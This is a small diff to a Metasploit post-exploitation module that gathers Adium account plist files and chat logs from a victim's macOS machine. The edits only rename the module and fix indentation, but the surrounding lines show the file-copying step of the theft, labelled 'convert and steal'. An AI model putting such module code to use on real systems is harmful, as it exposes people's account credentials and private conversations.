@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super(update_info(info,
-			'Name'          => 'OSX Gather Adium Enumeration',
+			'Name'          => 'OS X Gather Adium Enumeration',
 			'Description'   => %q{
 					This module will collect Adium's account plist files and chat logs from the
 				victim's machine.  There are three different actions you may choose: ACCOUNTS,
@@ -135,7 +135,7 @@ class Metasploit3 < Msf::Post
 			#
 			# Make a copy of the file we want to convert and steal
 			#
-		 	fpath = "#{base}#{file}"
+			fpath = "#{base}#{file}"
 			rand_name = "/tmp/#{Rex::Text.rand_text_alpha(5)}"
 			tmp = exec("cp #{fpath} #{rand_name}")
 
